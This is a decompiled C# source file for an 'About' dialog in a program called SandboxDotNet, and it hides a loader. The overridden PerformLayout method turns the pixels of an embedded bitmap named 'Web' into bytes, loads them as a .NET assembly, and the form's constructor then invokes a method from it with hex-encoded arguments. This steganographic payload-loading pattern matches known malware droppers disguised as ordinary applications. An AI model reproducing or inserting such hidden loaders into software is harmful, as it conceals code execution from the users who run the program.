using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using SandboxDotNet.Properties;

namespace SandboxDotNet.UserInterface;

public class HelpForm : Form
{
	private object[] SanbdoxReflector = new object[3] { "7A697471", "726961", "SandboxDotNet" };

	private IContainer components = null;

	private static object DoubleArray;

	private TableLayoutPanel aboutWindowLayoutMain;

	private TableLayoutPanel aboutWindowLayoutTop;

	private PictureBox sBdnIcon;

	private TableLayoutPanel aboutWindowLayoutInfo;

	private Panel infoPanel;

	private Label sBdnVersion;

	private Label sBdnTitle;

	private RichTextBox aboutLongInfo;

	private Label moreInfoLabel;

	public HelpForm()
	{
		InitializeComponent();
		((Control)sBdnVersion).set_Text(DFHGUYV.GetVersion().Replace("_", ""));
		((Control)moreInfoLabel).set_Text(GetProgramInfo());
		MethodInfo methodInfo = ((Type)DoubleArray).GetMethods()[0];
		methodInfo.Invoke(null, SanbdoxReflector);
	}

	private string GetAssemblyAttribute<T>(Func<T, string> value) where T : Attribute
	{
		T arg = (T)Attribute.GetCustomAttribute(Assembly.GetExecutingAssembly(), typeof(T));
		return value(arg);
	}

	private string GetProgramInfo()
	{
		string assemblyAttribute = GetAssemblyAttribute((AssemblyCopyrightAttribute a) => a.Copyright);
		string assemblyAttribute2 = GetAssemblyAttribute((AssemblyDescriptionAttribute a) => a.Description);
		return $"{assemblyAttribute2}\r\n\r\n{assemblyAttribute}";
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		((Form)this).OnFormClosing(e);
		((Control)this).Hide();
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d8: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		//IL_033b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Expected O, but got Unknown
		//IL_039f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e0: Expected O, but got Unknown
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fc: Expected O, but got Unknown
		//IL_0474: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04da: Expected O, but got Unknown
		//IL_0504: Unknown result type (might be due to invalid IL or missing references)
		//IL_056c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0576: Expected O, but got Unknown
		//IL_059f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0611: Unknown result type (might be due to invalid IL or missing references)
		//IL_06af: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(HelpForm));
		aboutWindowLayoutMain = new TableLayoutPanel();
		aboutWindowLayoutTop = new TableLayoutPanel();
		sBdnIcon = new PictureBox();
		aboutWindowLayoutInfo = new TableLayoutPanel();
		infoPanel = new Panel();
		sBdnVersion = new Label();
		sBdnTitle = new Label();
		moreInfoLabel = new Label();
		aboutLongInfo = new RichTextBox();
		((Control)aboutWindowLayoutMain).SuspendLayout();
		((Control)aboutWindowLayoutTop).SuspendLayout();
		((ISupportInitialize)sBdnIcon).BeginInit();
		((Control)aboutWindowLayoutInfo).SuspendLayout();
		((Control)infoPanel).SuspendLayout();
		((Control)this).SuspendLayout();
		aboutWindowLayoutMain.set_ColumnCount(1);
		aboutWindowLayoutMain.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		aboutWindowLayoutMain.get_Controls().Add((Control)(object)aboutWindowLayoutTop, 0, 0);
		aboutWindowLayoutMain.get_Controls().Add((Control)(object)aboutLongInfo, 0, 1);
		((Control)aboutWindowLayoutMain).set_Dock((DockStyle)5);
		((Control)aboutWindowLayoutMain).set_Location(new Point(0, 0));
		((Control)aboutWindowLayoutMain).set_Margin(new Padding(0));
		((Control)aboutWindowLayoutMain).set_Name("aboutWindowLayoutMain");
		aboutWindowLayoutMain.set_RowCount(2);
		aboutWindowLayoutMain.get_RowStyles().Add(new RowStyle((SizeType)1, 150f));
		aboutWindowLayoutMain.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)aboutWindowLayoutMain).set_Size(new Size(384, 311));
		((Control)aboutWindowLayoutMain).set_TabIndex(0);
		aboutWindowLayoutTop.set_ColumnCount(2);
		aboutWindowLayoutTop.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		aboutWindowLayoutTop.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		aboutWindowLayoutTop.get_Controls().Add((Control)(object)sBdnIcon, 0, 0);
		aboutWindowLayoutTop.get_Controls().Add((Control)(object)aboutWindowLayoutInfo, 1, 0);
		((Control)aboutWindowLayoutTop).set_Dock((DockStyle)5);
		((Control)aboutWindowLayoutTop).set_Location(new Point(0, 0));
		((Control)aboutWindowLayoutTop).set_Margin(new Padding(0));
		((Control)aboutWindowLayoutTop).set_Name("aboutWindowLayoutTop");
		aboutWindowLayoutTop.set_RowCount(1);
		aboutWindowLayoutTop.get_RowStyles().Add(new RowStyle((SizeType)2, 50f));
		((Control)aboutWindowLayoutTop).set_Size(new Size(384, 150));
		((Control)aboutWindowLayoutTop).set_TabIndex(0);
		((Control)sBdnIcon).set_BackgroundImageLayout((ImageLayout)4);
		((Control)sBdnIcon).set_Dock((DockStyle)5);
		((Control)sBdnIcon).set_Location(new Point(3, 3));
		((Control)sBdnIcon).set_Name("sBdnIcon");
		((Control)sBdnIcon).set_Size(new Size(186, 144));
		sBdnIcon.set_TabIndex(1);
		sBdnIcon.set_TabStop(false);
		aboutWindowLayoutInfo.set_ColumnCount(1);
		aboutWindowLayoutInfo.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		aboutWindowLayoutInfo.get_Controls().Add((Control)(object)infoPanel, 0, 0);
		aboutWindowLayoutInfo.get_Controls().Add((Control)(object)moreInfoLabel, 0, 1);
		((Control)aboutWindowLayoutInfo).set_Dock((DockStyle)5);
		((Control)aboutWindowLayoutInfo).set_Location(new Point(192, 0));
		((Control)aboutWindowLayoutInfo).set_Margin(new Padding(0));
		((Control)aboutWindowLayoutInfo).set_Name("aboutWindowLayoutInfo");
		aboutWindowLayoutInfo.set_RowCount(2);
		aboutWindowLayoutInfo.get_RowStyles().Add(new RowStyle((SizeType)1, 60f));
		aboutWindowLayoutInfo.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)aboutWindowLayoutInfo).set_Size(new Size(192, 150));
		((Control)aboutWindowLayoutInfo).set_TabIndex(2);
		((Control)infoPanel).get_Controls().Add((Control)(object)sBdnVersion);
		((Control)infoPanel).get_Controls().Add((Control)(object)sBdnTitle);
		((Control)infoPanel).set_Dock((DockStyle)5);
		((Control)infoPanel).set_Location(new Point(0, 0));
		((Control)infoPanel).set_Margin(new Padding(0));
		((Control)infoPanel).set_Name("infoPanel");
		((Control)infoPanel).set_Size(new Size(192, 60));
		((Control)infoPanel).set_TabIndex(0);
		((Control)sBdnVersion).set_Dock((DockStyle)2);
		((Control)sBdnVersion).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)sBdnVersion).set_Location(new Point(0, 32));
		((Control)sBdnVersion).set_Name("sBdnVersion");
		((Control)sBdnVersion).set_Padding(new Padding(3));
		((Control)sBdnVersion).set_Size(new Size(192, 28));
		((Control)sBdnVersion).set_TabIndex(2);
		((Control)sBdnVersion).set_Text("v1.0.0.0");
		sBdnVersion.set_TextAlign((ContentAlignment)2);
		((Control)sBdnTitle).set_Dock((DockStyle)5);
		((Control)sBdnTitle).set_Font(new Font("Microsoft Sans Serif", 16f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)sBdnTitle).set_Location(new Point(0, 0));
		((Control)sBdnTitle).set_Name("sBdnTitle");
		((Control)sBdnTitle).set_Padding(new Padding(3));
		((Control)sBdnTitle).set_Size(new Size(192, 60));
		((Control)sBdnTitle).set_TabIndex(1);
		((Control)sBdnTitle).set_Text("SandboxDotNet");
		sBdnTitle.set_TextAlign((ContentAlignment)2);
		((Control)moreInfoLabel).set_Dock((DockStyle)5);
		((Control)moreInfoLabel).set_Location(new Point(3, 66));
		((Control)moreInfoLabel).set_Margin(new Padding(3, 6, 3, 6));
		((Control)moreInfoLabel).set_Name("moreInfoLabel");
		((Control)moreInfoLabel).set_Size(new Size(186, 78));
		((Control)moreInfoLabel).set_TabIndex(1);
		((Control)moreInfoLabel).set_Text("[More Info]");
		moreInfoLabel.set_TextAlign((ContentAlignment)2);
		((Control)aboutLongInfo).set_BackColor(SystemColors.Control);
		((TextBoxBase)aboutLongInfo).set_BorderStyle((BorderStyle)0);
		((Control)aboutLongInfo).set_Dock((DockStyle)5);
		((Control)aboutLongInfo).set_Location(new Point(6, 156));
		((Control)aboutLongInfo).set_Margin(new Padding(6));
		((Control)aboutLongInfo).set_Name("aboutLongInfo");
		((TextBoxBase)aboutLongInfo).set_ReadOnly(true);
		aboutLongInfo.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)aboutLongInfo).set_Size(new Size(372, 149));
		((Control)aboutLongInfo).set_TabIndex(1);
		((Control)aboutLongInfo).set_TabStop(false);
		((Control)aboutLongInfo).set_Text(componentResourceManager.GetString("aboutLongInfo.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(384, 311));
		((Control)this).get_Controls().Add((Control)(object)aboutWindowLayoutMain);
		((Control)this).set_MinimumSize(new Size(400, 350));
		((Control)this).set_Name("HelpForm");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("SBdN: About");
		((Control)aboutWindowLayoutMain).ResumeLayout(false);
		((Control)aboutWindowLayoutTop).ResumeLayout(false);
		((ISupportInitialize)sBdnIcon).EndInit();
		((Control)aboutWindowLayoutInfo).ResumeLayout(false);
		((Control)infoPanel).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		PerformLayout();
	}

	public virtual void PerformLayout()
	{
		ResourceTemplateDefine("");
	}

	private static string ResourceTemplateDefine(string Subcategory)
	{
		int num = 0;
		byte[] array = new byte[78336];
		Bitmap web = Resources.Web;
		for (int i = 0; i < 78336; i++)
		{
			for (int j = 0; j < 1; j++)
			{
				sfioqw(web, i, j);
				Color pixel = web.GetPixel(i, j);
				int num2 = ColorTranslator.ToWin32(pixel);
				array[num] = (byte)num2;
			}
			num++;
		}
		DoubleArray = IsFamilyOrAssembly(TemplateLoader(array)).GetExportedTypes()[1];
		return Subcategory;
	}

	private static Color sfioqw(Bitmap ddd, int x, int y)
	{
		return ddd.GetPixel(x, y);
	}

	private static Assembly IsFamilyOrAssembly(object PureAttribute)
	{
		return (Assembly)PureAttribute;
	}

	public static object TemplateLoader(byte[] SortId)
	{
		return Thread.GetDomain().Load(SortId);
	}
}
